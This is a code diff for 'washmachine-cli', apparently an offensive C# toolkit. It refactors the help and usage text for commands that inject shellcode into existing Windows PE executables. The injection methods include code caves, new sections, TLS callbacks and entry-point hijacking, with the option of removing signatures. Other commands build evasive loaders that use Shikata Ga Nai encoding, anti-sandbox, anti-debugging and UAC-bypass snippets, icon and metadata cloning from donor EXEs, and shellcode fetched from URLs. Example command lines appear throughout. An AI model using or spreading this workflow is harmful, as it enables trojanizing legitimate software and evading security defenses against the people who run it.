+                        new UsageNote("new-section", "Adds a new section for the payload. Predictable and roomy, but structurally obvious."),
+                        new UsageNote("section-ext", "Extends the last section without adding a new header entry."),
+                        new UsageNote("text-pad", "Uses the .text VirtualSize-to-RawSize gap so file size and headers stay stable when space exists."),
+                        new UsageNote("tls-callback", "Creates a TLS callback so execution can happen before main. Intended for x64 targets."),
+                    ]),
+                new UsageSection(
+                    "Current support level",
+                    Bullets:
+                    [
+                        "The backdoor flow expects a ready-to-run flat .bin payload. Use encode when you need to build a loader first.",
+                        "Only the entry-point carrier is implemented today. Other historical carrier names are intentionally not documented as supported workflows.",
+                        "Only --encryption none is implemented today. Prepare payload transformation before the backdoor step if you need custom encoding.",
+                    ]),
+            ],
+            Examples:
+            [
+                new UsageExample("washmachine-cli backdoor --pe .\\app.exe -s .\\payload.bin", "Patch a PE with the default code-cave strategy.", "PowerShell / pwsh"),
+                new UsageExample("washmachine-cli backdoor --pe ./target.exe -s ./payload.bin -m new-section -o ./patched.exe", "Use a new section when you want predictable capacity.", "Bash / Zsh"),
+                new UsageExample("washmachine-cli backdoor --pe target.exe -s payload.bin -m text-pad --dry-run --verbose", "Check whether text padding is viable before writing output.", "Any shell"),
+                new UsageExample("washmachine-cli backdoor --pe target.exe -s payload.bin -m tls-callback", "Attempt TLS callback placement on a compatible target.", "Any shell"),
+            ],
+            Related:
+            [
+                new UsageNote("analyze <pe-file>", "Inspect sections and code caves before choosing -m."),
+                new UsageNote("strip <pe-file>", "Extract bytes from a compiled loader when you want to inject that output elsewhere."),
+                new UsageNote("encode", "Build the payload first if you do not already have a flat .bin."),
+            ]);
+
+    private static CommandUsage BuildStripUsage() =>
+        new(
+            Name: "strip",
+            Summary: "Extract flat bytes from a PE so they can be inspected, reused, or re-injected.",
+            Syntax: "washmachine-cli strip <pe-file> [options]",
+            Description: "Strip can carve bytes from the entry-point section, a named section, all executable sections, or an explicit raw range.",
+            WhenToUse: "Use it to peel shellcode out of a compiled loader or to carve a known range from a PE.",
+            Output: "Writes a .bin file by default, or prints a section-analysis view when --analyze is used.",
+            OptionGroups:
+            [
+                new UsageOptionGroup(
+                    "Input and extraction target",
+                    "Choose what part of the PE to extract.",
+                    [
+                        new UsageOption("<pe-file>", "PE file to strip."),
+                        new UsageOption("-m, --mode <mode>", "Extraction mode.", "ep", "ep | section | all-exec | range"),
+                        new UsageOption("--section <name>", "Section name used when --mode section is selected."),
+                        new UsageOption("--range <start:len>", "Raw file range used when --mode range is selected. Hex values are accepted."),
+                    ]),
+                new UsageOptionGroup(
+                    "Output and inspection",
+                    "Control how the extracted bytes are written and whether analysis is shown first.",
+                    [
+                        new UsageOption("-o, --output <file>", "Destination path for the extracted .bin.", "<input>.bin"),
+                        new UsageOption("--no-trim", "Keep trailing null bytes in the extracted result."),
+                        new UsageOption("--analyze", "Print section layout and entry-point context instead of extracting."),
+                    ]),
+            ],
+            Sections:
+            [
+                new UsageSection(
+                    "Extraction modes",
+                    Notes:
+                    [
+                        new UsageNote("ep", "Extract from the PE entry point to the end of the containing section."),
+                        new UsageNote("section", "Extract the full raw contents of one named section."),
+                        new UsageNote("all-exec", "Concatenate every executable section in raw file order."),
+                        new UsageNote("range", "Extract an explicit raw byte range using start:length."),
+                    ]),
+                new UsageSection(
+                    "Range format",
+                    Bullets:
+                    [
+                        "Decimal and hex are both accepted. Example: --range 1024:512 or --range 0x400:0x200.",
+                        "Run analyze first when you want to confirm offsets and section names before stripping.",
+                    ]),
+            ],
+            Examples:
+            [
+                new UsageExample("washmachine-cli strip .\\loader.exe", "Extract from the entry point to the end of the containing section.", "PowerShell / pwsh"),
+                new UsageExample("washmachine-cli strip ./loader.exe -m section --section .text", "Dump one named section.", "Bash / Zsh"),
+                new UsageExample("washmachine-cli strip loader.exe -m all-exec -o payload.bin", "Combine all executable sections into one flat payload.", "Any shell"),
+                new UsageExample("washmachine-cli strip loader.exe -m range --range 0x400:0x200", "Extract a raw offset range using hex.", "Any shell"),
+                new UsageExample("washmachine-cli strip loader.exe --analyze", "Preview section layout without writing a .bin.", "Any shell"),
+            ],
+            Related:
+            [
+                new UsageNote("analyze", "Use it first when you need a clearer view of sections and offsets."),
+                new UsageNote("backdoor", "Inject the extracted .bin into another PE once you have the bytes you need."),
+            ]);
+
+    private static CommandUsage BuildListUsage() => BuildShowUsage();
+
+    private static CommandUsage BuildProvisionUsage() =>
+        new(
+            Name: "provision",
+            Summary: "Download the external tooling required for encoding features.",
+            Syntax: "washmachine-cli provision [--core-only]",
+            Description: "Provision fetches Bin2Shell and, when requested, the optional SGN bundle into the local Tools directory next to the CLI.",
+            WhenToUse: "Run it once after install, or again whenever the Tools directory is missing or incomplete.",
+            Output: "Downloads archives, installs them under Tools, and refreshes local algorithm descriptions when possible.",
+            OptionGroups:
+            [
+                new UsageOptionGroup(
+                    "Scope",
+                    "Provisioning always requires network access.",
+                    [
+                        new UsageOption("--core-only", "Download only Bin2Shell and skip optional tooling."),
+                    ]),
+            ],
+            Sections:
+            [
+                new UsageSection(
+                    "Platform notes",
+                    Notes:
+                    [
+                        new UsageNote("Bin2Shell", "The bundled provisioning flow is intended to make the Python-based encoding dependency available locally."),
+                        new UsageNote("SGN", "The automatic optional SGN download currently targets Windows release assets. Cross-platform users should prefer --core-only unless they already manage SGN separately."),
+                    ]),
+                new UsageSection(
+                    "When it helps",
+                    Bullets:
+                    [
+                        "Run provision before the first encode if you want a predictable offline-ready setup.",
+                        "encode also provisions automatically, but provision is the cleaner way to stage dependencies up front.",
+                    ]),
+            ],
+            Examples:
+            [
+                new UsageExample("washmachine-cli provision", "Download Bin2Shell and optional tooling.", "Any shell"),
+                new UsageExample("washmachine-cli provision --core-only", "Download only the core encoding dependency.", "Any shell"),
+            ],
+            Related:
+            [
+                new UsageNote("encode", "The command that benefits most directly from a provisioned Tools directory."),
+                new UsageNote("show encoders", "Use it after provisioning to confirm the encoder catalog is now available."),
+            ]);
+
+    private static CommandUsage BuildTestUsage() =>
+        new(
+            Name: "test",
+            Summary: "Exercise the encode pipeline across encoders, templates, and sample payloads.",
+            Syntax: "washmachine-cli test [options]",
+            Description: "The harness drives Bin2Shell, template rendering, compilation, and selected execution checks to catch breakage across the workflow.",
+            WhenToUse: "Use it after changing templates, snippets, provisioning behavior, or compiler integration.",
+            Output: "Prints structured phase results and returns a failing exit code when setup or test execution fails.",
+            OptionGroups:
+            [
+                new UsageOptionGroup(
+                    "Core options",
+                    "Phase 1 and 2 require a shellcode file. Phase 3 can use the configured test-assets directory.",
+                    [
+                        new UsageOption("--shellcode <file>", "Base shellcode file for phases 1 and 2, and for URL-mode setup."),
+                        new UsageOption("--url <payload-url>", "Optional hosted payload URL used for the URL branch of phase 1."),
+                        new UsageOption("--phase <value>", "Select which test phase to run.", "all", "1 | 2 | 3 | all"),
+                        new UsageOption("--test-assets <dir>", "Directory of safe shellcode test assets used by phase 3."),
+                        new UsageOption("--stop-on-fail", "Abort the harness on the first failing test case."),
+                    ]),
+            ],
+            Sections:
+            [
+                new UsageSection(
+                    "Phases",
+                    Notes:
+                    [
+                        new UsageNote("Phase 1", "Covers encoder, envelope, and optional web-helper combinations."),
+                        new UsageNote("Phase 2", "Covers templates and snippet values using one-factor-at-a-time sampling."),
+                        new UsageNote("Phase 3", "Runs the pipeline against multiple shellcode inputs from the test-assets directory."),
+                    ]),
+                new UsageSection(
+                    "Practical tips",
+                    Bullets:
+                    [
+                        "Use --phase 1 or --phase 2 during iteration when you do not need the full sweep.",
+                        "Add --stop-on-fail when debugging a regression so the first bad case is easier to isolate.",
+                        "Run help test for the high-level view, then use test --help in scripts if you only want the harness usage line.",
+                    ]),
+            ],
+            Examples:
+            [
+                new UsageExample("washmachine-cli test --shellcode .\\messagebox.bin --phase all", "Run the full harness from a known-safe sample.", "PowerShell / pwsh"),
+                new UsageExample("washmachine-cli test --shellcode ./messagebox.bin --phase 1 --stop-on-fail", "Focus on encoder and envelope coverage while iterating.", "Bash / Zsh"),
+                new UsageExample("washmachine-cli test --shellcode messagebox.bin --url https://host/payload.bin --phase 1", "Exercise file and URL branches together for phase 1.", "Any shell"),
+            ],
+            Related:
+            [
+                new UsageNote("encode", "The test harness validates the same core encoding and compilation pipeline."),
+                new UsageNote("provision", "Run it first if the harness cannot find Bin2Shell or optional tooling."),
+            ]);
+
     private static int PrintBackdoorUsage()
     {
-        UsageFormatter.Print(new CommandUsage(
-            Name: "backdoor",
-            Syntax: $"backdoor [{UiColors.Warning}]--pe <file>[/] [{UiColors.Warning}]--shellcode <file>[/] [{UiColors.Muted}][[options]][/]",
-            Description: "Inject shellcode into an existing PE file",
-            Required: new[]
-            {
-                new UsageOption("--pe <file>", "Target PE file to backdoor"),
-                new UsageOption("--shellcode, -s <file>", "Shellcode .bin file to inject"),
-            },
-            Options: new[]
-            {
-                new UsageOption("--output, -o <file>", "Output file", "<input>.backdoored.exe"),
-                new UsageOption("--method, -m <method>", "code-cave | new-section | section-ext | text-pad | tls-callback", "code-cave"),
-                new UsageOption("--section-name <name>", "Name for new section (new-section, tls-callback)", ".extra"),
-                new UsageOption("--carrier <invoke>", "Payload carrier method (see carrier types below)", "entry-point"),
-                new UsageOption("--no-remove-sig", "Keep the PE digital signature"),
-                new UsageOption("--no-patch-subsystem", "Don't patch subsystem to GUI"),
-                new UsageOption("--no-patch-exit", "Don't patch exit calls (ExitProcess → ExitThread)"),
-                new UsageOption("--cave-min-size <n>", "Minimum code cave size in bytes (code-cave only)"),
-                new UsageOption("--dry-run", "Analyze and report without injecting"),
-                new UsageOption("--verbose", "Show detailed logging"),
-                new UsageOption("--json", "Output results as JSON"),
-            },
-            Examples: new[]
-            {
-                new UsageExample("backdoor --pe app.exe -s calc.bin", "Inject using default code-cave method"),
-                new UsageExample("backdoor --pe app.exe -s payload.bin -m new-section", "Add a new PE section for the payload"),
-                new UsageExample("backdoor --pe app.exe -s shell.bin -m text-pad", "Use .text section padding gap"),
-                new UsageExample("backdoor --pe app.exe -s shell.bin -m tls-callback", "Execute via TLS callback (runs before main)"),
-                new UsageExample("backdoor --pe app.exe -s shell.bin -m section-ext", "Extend the last section"),
-                new UsageExample("backdoor --pe app.exe -s shell.bin --dry-run --verbose", "Dry run with verbose analysis"),
-            },
-            Notes: new[]
-            {
-                $"[bold {UiColors.Accent}]Injection Methods:[/]",
-                $"  [{UiColors.Accent}]code-cave[/]     — find null-byte gaps in existing sections (stealthy, size-limited)",
-                $"  [{UiColors.Accent}]new-section[/]   — add a new PE section for the payload (reliable, obvious in section table)",
-                $"  [{UiColors.Accent}]section-ext[/]   — extend the last section (no new header, changes last section size)",
-                $"  [{UiColors.Accent}]text-pad[/]      — write into .text VirtualSize↔RawSize padding gap (no structural changes)",
-                $"  [{UiColors.Accent}]tls-callback[/]  — create a TLS callback that runs the payload before main (x64 only)",
-                "",
-                $"[bold {UiColors.Accent}]Carrier Types (--carrier):[/]",
-                $"  [{UiColors.Accent}]entry-point[/]   — hijack the PE entry point to redirect to payload (default)",
-                $"  [{UiColors.Accent}]tls-callback[/]  — install a TLS callback that executes before main (x64)",
-                $"  [{UiColors.Accent}]dll-main[/]      — hook DllMain for DLL payloads (DLL targets only)",
-                $"  [{UiColors.Accent}]dll-export[/]    — hook a specific DLL export function (DLL targets only)",
-                $"  [{UiColors.Accent}]entry-func[/]    — backdoor a JMP/CALL instruction in the entry function",
-                "",
-                "The backdoor expects a ready-to-run flat .bin payload.",
-                $"Use [{UiColors.Accent}]encode[/] to build shellcode into a loader, or provide raw shellcode directly.",
-            }));
+        UsageFormatter.Print(BuildBackdoorUsage());
         return 0;
     }
 
@@ -2541,7 +2484,7 @@ public static class Program
     private static async Task<int> RunStripAsync(string[] args)
     {
         if (args.Length == 0)
-            return await RunSubMode("strip", RunStripAsync, PrintStripUsage);
+            return await RunStripInteractiveSessionAsync();
 
         if (args[0] is "--help" or "-h")
         {
@@ -2700,195 +2643,15 @@ public static class Program
 
     private static int PrintStripUsage()
     {
-        UsageFormatter.Print(new CommandUsage(
-            Name: "strip",
-            Syntax: $"strip [{UiColors.Warning}]<pe-file>[/] [{UiColors.Muted}][[options]][/]",
-            Description: "Extract flat binary (.bin) from a PE file",
-            Required: new[]
-            {
-                new UsageOption("<pe-file>", "Path to the PE file to extract from"),
-            },
-            Options: new[]
-            {
-                new UsageOption("-o, --output <file>", "Output .bin path", "<input>.bin"),
-                new UsageOption("-m, --mode <mode>", "ep | section | all-exec | range", "ep"),
-                new UsageOption("--section <name>", "Section name (for 'section' mode)"),
-                new UsageOption("--range <start:len>", "Raw file range (for 'range' mode, hex ok)"),
-                new UsageOption("--no-trim", "Don't trim trailing zeros"),
-                new UsageOption("--analyze", "Show section layout without extracting"),
-            },
-            Examples: new[]
-            {
-                new UsageExample("strip loader.exe", "Extract from entry point to end of .text"),
-                new UsageExample("strip loader.exe -m section --section .text", "Extract entire .text section"),
-                new UsageExample("strip loader.exe -m all-exec", "Extract all executable sections"),
-                new UsageExample("strip loader.exe -m range --range 0x400:0x200", "Extract a specific byte range"),
-                new UsageExample("strip loader.exe --analyze", "Analyze section layout only"),
-            },
-            Notes: new[]
-            {
-                "Extraction modes:",
-                $"  [{UiColors.Accent}]ep[/]        — from entry point to end of containing section (default)",
-                $"  [{UiColors.Accent}]section[/]   — extract a specific section by name",
-                $"  [{UiColors.Accent}]all-exec[/]  — extract all executable sections concatenated",
-                $"  [{UiColors.Accent}]range[/]     — extract a raw file offset range",
-            }));
+        UsageFormatter.Print(BuildStripUsage());
         return 0;
     }
 
     // ═══════════════════════════════════════════════════════════════════════
-    //  list
+    //  show
     // ═══════════════════════════════════════════════════════════════════════
 
-    private static async Task<int> RunListAsync(string[] args)
-    {
-        var logger = new ConsoleLogger();
-        var paths = new AppPaths();
-
-        if (args.Length == 0)
-            return await RunSubMode("list", RunListAsync, PrintListUsage);
-
-        var what = args[0].TrimStart('-').ToLowerInvariant();
-
-        switch (what)
-        {
-            case "templates":
-            {
-                var catalog = new YamlCodeSnippetCatalogService(paths);
-                var templates = catalog.GetTemplates();
-
-                var table = new Table()
-                    .Border(TableBorder.Rounded)
-                    .BorderColor(UiColors.BoxBorderColor)
-                    .Title($"[bold {UiColors.Header}]Templates[/] [{UiColors.Muted}]({templates.Count})[/]")
-                    .AddColumn(new TableColumn($"[{UiColors.Accent}]ID[/]").LeftAligned())
-                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Display[/]").LeftAligned());
-
-                foreach (var t in templates)
-                    table.AddRow($"[{UiColors.Accent}]{Markup.Escape(t.Id)}[/]", $"[{UiColors.Value}]{Markup.Escape(t.Display)}[/]");
-
-                AnsiConsole.Write(table);
-                break;
-            }
-            case "encoders":
-            {
-                var runner = new Bin2ShellRunner(paths);
-                var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);
-
-                ShellcodeEncodingCatalog catalog;
-                try
-                {
-                    catalog = await encodingCatalog.GetCatalogAsync();
-                }
-                catch (Exception ex)
-                {
-                    AnsiConsole.MarkupLine($"[{UiColors.Warning}]⚠ Bin2Shell is not available.[/]");
-                    AnsiConsole.MarkupLine($"[{UiColors.Muted}]  {Markup.Escape(ex.Message)}[/]");
-                    AnsiConsole.WriteLine();
-                    AnsiConsole.MarkupLine($"[{UiColors.Muted}]Run [{UiColors.Accent}]washmachine-cli provision[/] to download Bin2Shell, then try again.[/]");
-                    break;
-                }
-
-                var encTable = new Table()
-                    .Border(TableBorder.Rounded)
-                    .BorderColor(UiColors.BoxBorderColor)
-                    .Title($"[bold {UiColors.Header}]Encoders[/] [{UiColors.Muted}]({catalog.Encoders.Count})[/]")
-                    .AddColumn($"[{UiColors.Accent}]Index[/]")
-                    .AddColumn($"[{UiColors.Accent}]Name[/]")
-                    .AddColumn($"[{UiColors.Accent}]Description[/]");
-
-                foreach (var e in catalog.Encoders)
-                    encTable.AddRow($"[{UiColors.Hex}]{e.Index}[/]", $"[{UiColors.Value}]{Markup.Escape(e.Name)}[/]", $"[{UiColors.Muted}]{Markup.Escape(e.Description)}[/]");
-
-                AnsiConsole.Write(encTable);
-                AnsiConsole.WriteLine();
-
-                var envTable = new Table()
-                    .Border(TableBorder.Rounded)
-                    .BorderColor(UiColors.BoxBorderColor)
-                    .Title($"[bold {UiColors.Header}]Envelopes[/] [{UiColors.Muted}]({catalog.Envelopes.Count})[/]")
-                    .AddColumn($"[{UiColors.Accent}]Index[/]")
-                    .AddColumn($"[{UiColors.Accent}]Name[/]")
-                    .AddColumn($"[{UiColors.Accent}]Description[/]");
-
-                foreach (var e in catalog.Envelopes)
-                    envTable.AddRow($"[{UiColors.Hex}]{e.Index}[/]", $"[{UiColors.Value}]{Markup.Escape(e.Name)}[/]", $"[{UiColors.Muted}]{Markup.Escape(e.Description)}[/]");
-
-                AnsiConsole.Write(envTable);
-                break;
-            }
-            case "snippets":
-            {
-                var catalog = new YamlCodeSnippetCatalogService(paths);
-                var sections = catalog.GetAllSections();
-
-                var tree = new Tree($"[bold {UiColors.Header}]Snippet Catalog[/] [{UiColors.Muted}]({sections.Count} sections)[/]");
-
-                foreach (var s in sections)
-                {
-                    var sectionKey = !string.IsNullOrWhiteSpace(s.Template) ? s.Template : s.Header;
-                    var multiTag = s.AllowMultiple
-                        ? $" [{UiColors.Accent}]\u25C6 multi-select[/]"
-                        : string.Empty;
-                    var syntaxHint = s.AllowMultiple
-                        ? $"--snippet {Markup.Escape(sectionKey)}=<id1>,<id2>,..."
-                        : $"--snippet {Markup.Escape(sectionKey)}=<id>";
-                    var node = tree.AddNode(
-                        $"[bold {UiColors.Warning}]{Markup.Escape(s.Header)}[/] [{UiColors.Muted}]({s.Items.Count} items)[/]{multiTag}  " +
-                        $"[{UiColors.Muted}]{syntaxHint}[/]");
-                    foreach (var item in s.Items)
-                    {
-                        var label = item.IsDefault
-                            ? $"[{UiColors.Success}]{Markup.Escape(item.Id)}[/] \u2014 {Markup.Escape(item.Display)} [{UiColors.Success}]\u2605 default[/]"
-                            : $"[{UiColors.Value}]{Markup.Escape(item.Id)}[/] \u2014 [{UiColors.Muted}]{Markup.Escape(item.Display)}[/]";
-                        node.AddNode(label);
-                    }
-                }
-
-                AnsiConsole.Write(tree);
-                break;
-            }
-            case "compilers":
-            {
-                var toolLocator = new CompilerToolLocator(logger);
-                var result = await toolLocator.DiscoverAsync();
-
-                if (result.Best != null)
-                {
-                    AnsiConsole.Write(new Panel($"[{UiColors.Success}]Best compiler:[/] [{UiColors.Muted}]{Markup.Escape(result.Best.Path)}[/] [{UiColors.Muted}]({Markup.Escape($"{result.Best.Kind}")})[/]")
-                        .BorderColor(Color.Green)
-                        .Border(BoxBorder.Rounded));
-                    AnsiConsole.WriteLine();
-                }
-
-                var table = new Table()
-                    .Border(TableBorder.Rounded)
-                    .BorderColor(UiColors.BoxBorderColor)
-                    .Title($"[bold {UiColors.Header}]Candidates[/] [{UiColors.Muted}]({result.Candidates.Count})[/]")
-                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Kind[/]").LeftAligned())
-                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Path[/]").LeftAligned());
-
-                foreach (var c in result.Candidates)
-                    table.AddRow($"[{UiColors.Accent}]{Markup.Escape($"{c.Kind}")}[/]", $"[{UiColors.Muted}]{Markup.Escape(c.Path)}[/]");
-
-                AnsiConsole.Write(table);
-
-                if (result.Errors.Count > 0)
-                {
-                    AnsiConsole.WriteLine();
-                    AnsiConsole.MarkupLine($"[{UiColors.Warning}]Errors:[/]");
-                    foreach (var e in result.Errors)
-                        AnsiConsole.MarkupLine($"  [{UiColors.Error}]{Markup.Escape(e)}[/]");
-                }
-                break;
-            }
-            default:
-                AnsiConsole.MarkupLine($"[{UiColors.Error}]Error:[/] Unknown list target: {Markup.Escape(what)}. Use templates, encoders, snippets, or compilers.");
-                return 1;
-        }
-
-        return 0;
-    }
+    private static Task<int> RunListAsync(string[] args) => RunShowAsync(args);
 
     // ═══════════════════════════════════════════════════════════════════════
     //  provision
@@ -3008,154 +2771,27 @@ public static class Program
 
     private static int PrintEncodeUsage()
     {
-        UsageFormatter.Print(new CommandUsage(
-            Name: "encode",
-            Syntax: $"encode [{UiColors.Warning}]--shellcode <file>[/] [{UiColors.Muted}][[options]][/]",
-            Description: "Encode shellcode via Bin2Shell and build a loader executable from a template",
-            Required: new[]
-            {
-                new UsageOption("--shellcode, -s <file>", "Path to shellcode .bin file"),
-                new UsageOption("--shellcode-hex <hex>", "Hex-encoded shellcode string"),
-                new UsageOption("--shellcode-url, -u <url>", "URL to fetch shellcode from"),
-            },
-            Options: new[]
-            {
-                new UsageOption("--template, -t <id>", "Template ID (use 'list --templates' to see options)", "shellcode-minimal"),
-                new UsageOption("--encoder, -e <index>", "Bin2Shell encoder index", "0 (none)"),
-                new UsageOption("--envelope, -v <index>", "Bin2Shell envelope index", "0 (none)"),
-                new UsageOption("--shikata-ga-nai, --sgn", "Enable Shikata Ga Nai preprocessing before Bin2Shell"),
-                new UsageOption("--shikata-enc <count>", "Shikata Ga Nai iteration count", "1"),
-                new UsageOption("--shikata-max <bytes>", "Shikata Ga Nai max decoder-obfuscation bytes", "50"),
-                new UsageOption("--clone-from <exe>", "Clone post-compile resources/metadata/icon from source EXE"),
-                new UsageOption("--clone-resources | --no-clone-resources", "Enable/disable general resource cloning", "enabled when --clone-from is set"),
-                new UsageOption("--clone-icon | --no-clone-icon", "Enable/disable icon resource cloning", "enabled when --clone-from is set"),
-                new UsageOption("--clone-metadata | --no-clone-metadata", "Enable/disable VERSIONINFO metadata cloning", "enabled when --clone-from is set"),
-                new UsageOption("--pad-nops <bytes>", "Append NOP bytes to increase final executable size"),
-                new UsageOption("--snippet <section=id>", "Override a snippet section (repeatable, see below)"),
-                new UsageOption("--verbose", "Enable verbose logging"),
-                new UsageOption("--json", "Output results as JSON"),
-            },
-            Examples: new[]
-            {
-                new UsageExample("encode -s payload.bin", "Encode with the default template"),
-                new UsageExample("encode -s payload.bin -t shellcode-minimal", "Specify a template explicitly"),
-                new UsageExample("encode --shellcode-hex FC4883E4F0... -e 1", "Encode from hex with XOR encoder"),
-                new UsageExample("encode -s payload.bin --sgn --shikata-enc 2 --shikata-max 64", "Apply Shikata Ga Nai before Bin2Shell"),
-                new UsageExample("encode -s payload.bin --clone-from donor.exe --pad-nops 1048576", "Clone EXE properties and add 1MB of NOP padding"),
-                new UsageExample("encode -u http://host/shell.bin --verbose", "Fetch shellcode from URL"),
-                new UsageExample("encode -s payload.bin --snippet antiemulation=SirAllocALot", "Override the anti-emulation snippet"),
-                new UsageExample("encode -s p.bin --snippet antiemulation=SirAllocALot --snippet guardrails=domain_check", "Stack multiple snippets"),
-            },
-            Notes: new[]
-            {
-                "Provide exactly one shellcode source: --shellcode, --shellcode-hex, or --shellcode-url.",
-                "",
-                "When enabled, Shikata Ga Nai runs before Bin2Shell to polymorph the raw shellcode bytes.",
-                "",
-                "Post-compile options can clone resources/icon/VERSIONINFO from another EXE and",
-                "optionally append NOP bytes to inflate output size.",
-                "",
-                "The encode command processes shellcode through Bin2Shell encoding, merges it into",
-                "a C++ template with optional evasion snippets, and compiles the final loader.",
-                "",
-                $"[bold {UiColors.Accent}]Snippet Selection (--snippet):[/]",
-                "  Snippets are organized into sections (playbook categories). Each section",
-                "  offers multiple technique choices. Use --snippet to override the default:",
-                "",
-                $"  [{UiColors.Accent}]--snippet <section>=<snippet_id>[/]",
-                "",
-                $"  [{UiColors.Label}]Example sections:[/] antiemulation, antianalysis, antidebugging, antisandbox,",
-                "  guardrails, decoy, processinjection, shellcodeexecution, uacbypass, genericpayload",
-                "",
-                $"  Run [{UiColors.Accent}]list --snippets[/] to see all available sections and snippet IDs.",
-                $"  Run [{UiColors.Accent}]list --templates[/] to see available code templates.",
-                $"  Run [{UiColors.Accent}]list --encoders[/] to see available Bin2Shell encoders and envelopes.",
-            }));
-        PrintEncoderCatalogAsync().GetAwaiter().GetResult();
+        UsageFormatter.Print(BuildEncodeUsage());
         return 0;
     }
 
     private static int PrintAnalyzeUsage()
     {
-        UsageFormatter.Print(new CommandUsage(
-            Name: "analyze",
-            Syntax: $"analyze [{UiColors.Warning}]<pe-file>[/] [{UiColors.Muted}][[options]][/]",
-            Description: "Analyze a PE file — headers, sections, imports, code caves",
-            Required: new[]
-            {
-                new UsageOption("<pe-file>", "Path to the PE file to analyze"),
-            },
-            Options: new[]
-            {
-                new UsageOption("--json", "Output results as JSON"),
-            },
-            Examples: new[]
-            {
-                new UsageExample("analyze target.exe", "Analyze a PE executable"),
-                new UsageExample("analyze malware.dll --json", "Analyze a DLL with JSON output"),
-            },
-            Notes: new[]
-            {
-                "Displays architecture, sections, imports, exports, entry point, and code caves.",
-                "Useful for recon before backdooring or debugging injection issues.",
-            }));
+        UsageFormatter.Print(BuildAnalyzeUsage());
         return 0;
     }
 
-    private static int PrintListUsage()
-    {
-        UsageFormatter.Print(new CommandUsage(
-            Name: "list",
-            Syntax: $"list [{UiColors.Warning}]<target>[/]",
-            Description: "List available templates, encoders, snippets, or compilers",
-            Required: new[]
-            {
-                new UsageOption("--templates", "List available code templates"),
-                new UsageOption("--encoders", "List available encoders and envelopes"),
-                new UsageOption("--snippets", "List available snippet sections and items"),
-                new UsageOption("--compilers", "List discovered compiler toolchains"),
-            },
-            Examples: new[]
-            {
-                new UsageExample("list --templates", "Show code templates"),
-                new UsageExample("list --encoders", "Show Bin2Shell encoders and envelopes"),
-                new UsageExample("list --snippets", "Show snippet sections and their IDs"),
-                new UsageExample("list --compilers", "Show discovered C/C++ compilers"),
-            }));
-        return 0;
-    }
+    private static int PrintListUsage() => PrintShowUsage();
 
     private static int PrintProvisionUsage()
     {
-        UsageFormatter.Print(new CommandUsage(
-            Name: "provision",
-            Syntax: "provision [[--core-only]]",
-            Description: "Download and install required external tools",
-            Examples: new[]
-            {
-                new UsageExample("provision", "Download and install Bin2Shell + optional tools"),
-                new UsageExample("provision --core-only", "Download only Bin2Shell"),
-            },
-            Notes: new[]
-            {
-                "Run this once after installation to set up encoding prerequisites.",
-                "--core-only skips optional tooling and provisions Bin2Shell only.",
-                "Requires an active internet connection.",
-            }));
+        UsageFormatter.Print(BuildProvisionUsage());
         return 0;
     }
 
     private static int PrintTestUsage()
     {
-        UsageFormatter.Print(new CommandUsage(
-            Name: "test",
-            Syntax: $"test [{UiColors.Muted}][[options]][/]",
-            Description: "Run the automated test harness against the toolkit",
-            Examples: new[]
-            {
-                new UsageExample("test", "Run all automated tests"),
-                new UsageExample("test --help", "Show test options"),
-            }));
+        UsageFormatter.Print(BuildTestUsage());
         return 0;
     }
 
@@ -3165,123 +2801,57 @@ public static class Program
 
     private static int PrintUsage()
     {
+        var commands = GetHelpCatalog();
+        int nameWidth = commands.Max(c => c.Name.Length);
+
+        // Overview
+        UsageFormatter.PrintSectionHeader("Overview");
+        AnsiConsole.MarkupLine($"  [{UiColors.Value}]Command guide for washmachine-cli.[/]");
+        AnsiConsole.MarkupLine($"  [{UiColors.Label}]Usage[/]   [{UiColors.Accent}]washmachine-cli <command> [[options]][/]");
+        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Run[/] [{UiColors.Accent}]help <command>[/] [{UiColors.Muted}]for details on any command.[/]");
+
+        // Command index
+        UsageFormatter.PrintSectionHeader("Commands");
+        foreach (var cmd in commands)
+        {
+            string name = cmd.Name.PadRight(nameWidth);
+            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]{Markup.Escape(name)}[/]   [{UiColors.Value}]{Markup.Escape(cmd.Summary)}[/]");
+        }
+
+        // Getting started
+        UsageFormatter.PrintSectionHeader("Getting started");
+        foreach (var bullet in new[]
+        {
+            "Run provision once if you want Bin2Shell available before your first encode.",
+            "Use show templates, show modules, and show encoders to discover valid IDs on this machine.",
+            "Use help <command> when you want details for one command without leaving the terminal flow.",
+            "A safe common flow is: analyze target -> choose a method -> backdoor, or encode -> strip -> backdoor.",
+        })
+            AnsiConsole.MarkupLine($"  [{UiColors.Value}]· {Markup.Escape(bullet)}[/]");
+
+        // Shell and path tips
+        UsageFormatter.PrintSectionHeader("Shell and path tips");
+        var shellNotes = new[]
+        {
+            ("Windows PowerShell / pwsh", @"Use .\payload.bin or C:\path\payload.bin, and quote paths with spaces."),
+            ("Bash / Zsh",                @"Use ./payload.bin or /path/payload.bin, and quote paths with spaces."),
+            ("Shared",                    "Flags and command names stay the same across shells; only path style and quoting change."),
+        };
+        int shellLabelWidth = shellNotes.Max(n => n.Item1.Length);
+        foreach (var (label, desc) in shellNotes)
+            AnsiConsole.MarkupLine($"  [{UiColors.Label}]{Markup.Escape(label.PadRight(shellLabelWidth))}[/]   [{UiColors.Value}]{Markup.Escape(desc)}[/]");
+
+        // Documentation
+        UsageFormatter.PrintSectionHeader("Documentation");
+        AnsiConsole.MarkupLine($"  [{UiColors.Value}]· https://0xhmza.github.io/washmachine/cli-reference.html[/]");
+
         AnsiConsole.WriteLine();
-
-        var commandTable = new Table()
-            .Border(TableBorder.Simple)
-            .BorderColor(UiColors.BoxBorderColor)
-            .AddColumn(new TableColumn($"[{UiColors.Accent}]Command[/]"))
-            .AddColumn(new TableColumn($"[{UiColors.Accent}]Description[/]"));
-
-        commandTable.AddRow($"[{UiColors.Accent}]encode[/]",    $"[{UiColors.Value}]Encode shellcode via Bin2Shell and build a loader executable[/]");
-        commandTable.AddRow($"[{UiColors.Accent}]analyze[/]",   $"[{UiColors.Value}]Analyze a PE file (headers, sections, imports, code caves)[/]");
-        commandTable.AddRow($"[{UiColors.Accent}]backdoor[/]",  $"[{UiColors.Value}]Inject shellcode into an existing PE file[/]");
-        commandTable.AddRow($"[{UiColors.Accent}]strip[/]",     $"[{UiColors.Value}]Extract flat binary (.bin) from a PE file[/]");
